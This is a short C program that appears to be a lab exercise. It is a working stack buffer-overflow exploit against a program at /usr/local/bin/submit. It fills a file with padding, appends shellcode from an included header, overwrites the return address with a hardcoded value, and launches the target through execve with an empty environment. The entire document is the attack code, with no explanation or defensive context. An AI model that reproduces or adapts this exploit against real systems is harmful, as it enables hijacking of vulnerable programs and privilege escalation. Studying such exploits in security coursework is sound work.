#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode.h"

#define COMMAND "/usr/local/bin/submit"

int main(void) {
  char *args[4], *env[1];
  FILE *f;
  int i, garbage;

  garbage = 2048 - strlen(shellcode) + 4;

  f = fopen("exploit.haxx", "w");
  for (i = 0; i < garbage; ++i) {
    fprintf(f, "%c", 'A');
  }
  fprintf(f, "%s", shellcode);
  fprintf(f, "%c%c%c%c", 0x0f, 0xde, 0xbf, 0xff);  // garbage ends at 0xffbfde0f
  fclose(f);

  args[0] = COMMAND;
  args[1] = "exploit.haxx";
  args[2] = "message";
  args[3] = NULL;

  env[0] = NULL;

  return execve(COMMAND, args, env);
}
